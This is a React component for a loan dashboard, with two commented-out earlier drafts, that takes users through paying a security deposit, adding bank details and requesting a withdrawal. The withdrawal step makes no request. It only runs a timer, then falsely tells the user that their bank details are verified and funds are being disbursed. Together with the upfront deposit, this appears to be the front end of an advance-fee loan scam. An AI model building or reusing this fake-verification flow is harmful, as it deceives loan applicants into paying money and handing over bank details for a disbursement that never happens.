// "use client";

// import { useEffect, useState } from "react";
// import PaymentModal from "@/components/PaymentModal";
// import BankAction from "@/components/BankSelect";

// export default function DashboardClient({
//   user,
//   totalLoan,
//   securityDeposit,
//   depositPercentage,
//   depositTx,
//   withdrawalTx,
//   bank,
// }) {
//   const [showBankModal, setShowBankModal] = useState(false);
//   const [spinning, setSpinning] = useState(true);

//   // Logic for the 40-second processing simulation
//   useEffect(() => {
//     const timer = setTimeout(() => {
//       setSpinning(false);
//     }, 40000); 
//     return () => clearTimeout(timer);
//   }, []);

//   // 1. Check if deposit is completed
//   const isDepositPaid = depositTx?.status === "completed" || user?.loanStatus?.depositPaid;
  
//   // 2. Check if bank details exist
//   const hasBankDetails = Boolean(bank);

//   // 3. Check if withdrawal is in progress (after bank details are added)
//   const isWithdrawalProcessing = withdrawalTx?.status === "processing" || withdrawalTx?.status === "pending";

//   // If the 40s timer is active and we are in a final processing state
//   if (!spinning && isWithdrawalProcessing) {
//     return (
//       <div className="text-center mt-20">
//         <h1 className="text-2xl font-bold">Your Transfer is currently Processing</h1>
//         <p className="text-gray-500">Please check back later.</p>
//       </div>
//     );
//   }

//   return (
//     <div className="p-6 flex flex-col items-center justify-center min-h-[200px]">
      
//       {/* STEP 1: Pay Security Deposit */}
//       {!isDepositPaid ? (
//         <PaymentModal
//           triggerLabel="Pay Security Deposit"
//           loanAmount={totalLoan}
//           deposit={securityDeposit}
//           percentage={depositPercentage}
//         />
//       ) : 
      
//       /* STEP 2: Add Bank Details (Only shows if Deposit is Paid but no Bank) */
//       !hasBankDetails ? (
//         <button
//           onClick={() => setShowBankModal(true)}
//           className="px-6 py-3 rounded-xl font-bold bg-blue-600 text-white hover:bg-blue-700 transition"
//         >
//           Add Bank Details
//         </button>
//       ) : 
      
//       /* STEP 3: Make Withdrawal (Only shows if Bank exists and withdrawal is awaiting) */
//       withdrawalTx?.status === "awaiting_bank" ? (
//         <button
//           onClick={() => setShowBankModal(true)} // Or your specific withdrawal logic
//           className="px-6 py-3 rounded-xl font-bold bg-green-600 text-white hover:bg-green-700 transition"
//         >
//           Make Withdrawal
//         </button>
//       ) : (
//         /* FINAL STEP: Processing State */
//         <div className="text-center">
//            <div className="w-10 h-10 border-4 border-green-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
//            <p className="font-medium text-slate-700">Withdrawal is being processed...</p>
//         </div>
//       )}

//       {/* Modals */}
//       {showBankModal && (
//         <BankAction
//           withdrawalId={withdrawalTx?._id}
//           amount={withdrawalTx?.amount}
//           onClose={() => setShowBankModal(false)}
//         />
//       )}
//     </div>
//   );
// }

// "use client";

// import { useEffect, useState } from "react";
// import PaymentModal from "@/components/PaymentModal";
// import BankAction from "@/components/BankSelect";

// export default function DashboardClient({
//   user,
//   totalLoan,
//   securityDeposit,
//   depositPercentage,
//   depositTx,
//   withdrawalTx,
//   bank,
// }) {
//   const [showBankModal, setShowBankModal] = useState(false);
//   const [isFinalizing, setIsFinalizing] = useState(false); // Controls the "Processing" popup
//   const [spinning, setSpinning] = useState(false);

//   // Logic for the 40-second processing simulation
//   useEffect(() => {
//     if (isFinalizing) {
//       setSpinning(true);
//       const timer = setTimeout(() => {
//         setSpinning(false);
//         // After 40s, you could redirect or show a final success message
//       }, 40000);
//       return () => clearTimeout(timer);
//     }
//   }, [isFinalizing]);

//   // Logic checks
//   const isDepositPaid = depositTx?.status === "completed" || user?.loanStatus?.depositPaid;
//   const hasBankDetails = Boolean(bank);
//   const isAwaitingWithdrawal = withdrawalTx?.status === "awaiting_bank";

//   // 1. Show "Transfer Processing" after the 40s timer ends
//   if (isFinalizing && !spinning) {
//     return (
//       <div className="text-center mt-20">
//         <h1 className="text-2xl font-bold text-green-600">Transfer Processing</h1>
//         <p className="text-gray-500 mt-2">Your funds are being processed to be disbursed to your bank account.</p>
//       </div>
//     );
//   }

//   return (
//     <div className="p-6 flex flex-col items-center justify-center min-h-75">
      
//       {/* STEP 1: Pay Security Deposit */}
//       {!isDepositPaid ? (
//         <PaymentModal
//           triggerLabel="Pay Security Deposit"
//           loanAmount={totalLoan}
//           deposit={securityDeposit}
//           percentage={depositPercentage}
//         />
//       ) : 
      
//       /* STEP 2: Add Bank Details (Only shows if Deposit is Paid but no Bank) */
//       !hasBankDetails ? (
//         <button
//           onClick={() => setShowBankModal(true)}
//           className="px-8 py-4 rounded-xl font-bold bg-blue-600 text-white hover:bg-blue-700 shadow-lg transition-all"
//         >
//           Add Bank Details
//         </button>
//       ) : 
      
//       /* STEP 3: Make Withdrawal (Only shows if Bank exists and withdrawal is ready) */
//       isAwaitingWithdrawal ? (
//         <button
//           onClick={() => setIsFinalizing(true)} // This triggers the processing popup
//           className="px-8 py-4 rounded-xl font-bold bg-green-600 text-white hover:bg-green-700 shadow-lg transition-all"
//         >
//           Make Withdrawal
//         </button>
//       ) : (
//         /* FALLBACK: If everything is done or in an unknown state */
//         <p className="text-gray-500 italic">No pending actions available.</p>
//       )}

//       {/* --- MODALS & OVERLAYS --- */}

//       {/* Bank Details Modal */}
//       {showBankModal && (
//         <BankAction
//           withdrawalId={withdrawalTx?._id}
//           amount={withdrawalTx?.amount}
//           onClose={() => setShowBankModal(false)}
//         />
//       )}

//       {/* Processing Popup (Triggered by Make Withdrawal) */}
//       {isFinalizing && spinning && (
//         <div className="fixed inset-0 backdrop-blur-sm z-50 flex items-center justify-center p-4">
//           <div className="bg-white rounded-2xl p-8 shadow-2xl text-center max-w-sm w-full animate-in fade-in zoom-in duration-300">
//             <h3 className="text-xl font-bold text-slate-800">
//               Withdrawal Processing
//             </h3>
//             <p className="text-sm text-slate-500 mt-3 leading-relaxed">
//               Your bank details have been verified. 
//               <br />
//               Please stay on this page while we finalize your loan disbursement.
//             </p>

//             <div className="mt-6 flex flex-col items-center">
//               <div className="w-12 h-12 border-4 border-green-600 border-t-transparent rounded-full animate-spin"></div>
//               <span className="mt-4 text-xs font-semibold text-green-600 uppercase tracking-wider">
//                 Securing Transfer...
//               </span>
//             </div>
//           </div>
//         </div>
//       )}
//     </div>
//   );
// }

"use client";

import { useEffect, useState } from "react";
import PaymentModal from "@/components/PaymentModal";
import BankAction from "@/components/BankSelect";

export default function DashboardClient({
  user,
  totalLoan,
  securityDeposit,
  depositPercentage,
  depositTx,
  withdrawalTx,
  bank,
}) {
  const [showBankModal, setShowBankModal] = useState(false);
  const [isFinalizing, setIsFinalizing] = useState(false);
  const [spinning, setSpinning] = useState(false);

  useEffect(() => {
    if (isFinalizing) {
      setSpinning(true);
      const timer = setTimeout(() => {
        setSpinning(false);
      }, 20000);
      return () => clearTimeout(timer);
    }
  }, [isFinalizing]);

  const isDepositPaid = depositTx?.status === "completed" || user?.loanStatus?.depositPaid;
  const hasBankDetails = Boolean(bank);
  const isAwaitingWithdrawal = withdrawalTx?.status === "awaiting_bank";

  return (
    <div className="p-6 flex flex-col items-center justify-center min-h-screen bg-gray-50">
      
      {/* THE PERSISTENT CARD CONTAINER */}
      <div className="bg-white rounded-3xl p-8 shadow-xl max-w-md w-full border border-gray-100 min-h-75 flex flex-col items-center justify-center text-center">
        
        {/* STATE 1: 40-Second Processing (Inline) */}
        {isFinalizing && spinning ? (
          <div className="animate-in fade-in duration-500 flex flex-col items-center">
            <h3 className="text-xl font-bold text-slate-800">Withdrawal Processing</h3>
            <p className="text-sm text-slate-500 mt-3 leading-relaxed">
              Your bank details have been verified.
              <br />
              Please stay on this page while we finalize your loan disbursement.
            </p>
            <div className="mt-8 flex flex-col items-center">
              <div className="w-12 h-12 border-4 border-green-600 border-t-transparent rounded-full animate-spin"></div>
              <span className="mt-4 text-[10px] font-bold text-green-600 uppercase tracking-widest animate-pulse">
                Securing Transfer...
              </span>
            </div>
          </div>
        ) : 

        /* STATE 2: Success Message (Inline) */
        isFinalizing && !spinning ? (
          <div className="animate-in zoom-in duration-500">
            <div className="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h1 className="text-2xl font-bold text-green-600">Transfer Processing</h1>
            <p className="text-gray-500 mt-2">
              Your funds are being processed to be disbursed to your bank account.
            </p>
          </div>
        ) : (

          /* STATE 3: The Steps Workflow (Inline) */
          <div className="w-full space-y-6 animate-in fade-in">
            <div className="mb-6">
              <h2 className="text-2xl font-black text-slate-900">Loan Dashboard</h2>
              <p className="text-slate-400 text-sm">Please complete the required actions.</p>
            </div>

            {!isDepositPaid ? (
              <PaymentModal
                triggerLabel="Pay Security Deposit"
                loanAmount={totalLoan}
                deposit={securityDeposit}
                percentage={depositPercentage}
              />
            ) : !hasBankDetails ? (
              <button
                onClick={() => setShowBankModal(true)}
                className="w-full px-8 py-5 rounded-2xl font-bold bg-blue-600 text-white hover:bg-blue-700 shadow-lg transition-all active:scale-95"
              >
                Add Bank Details
              </button>
            ) : isAwaitingWithdrawal ? (
              <button
                onClick={() => setIsFinalizing(true)}
                className="w-full px-8 py-5 rounded-2xl font-bold bg-green-600 text-white hover:bg-green-700 shadow-lg transition-all active:scale-95"
              >
                Make Withdrawal
              </button>
            ) : (
              <p className="text-gray-400 italic">No pending actions available.</p>
            )}
          </div>
        )}
      </div>

      {/* --- EXTERNAL POPUPS --- */}

      {/* Bank Details Modal (Renders as Pop-up) */}
      {showBankModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-sm">
          <BankAction
            withdrawalId={withdrawalTx?._id}
            amount={withdrawalTx?.amount}
            onClose={() => setShowBankModal(false)}
          />
        </div>
      )}
    </div>
  );
}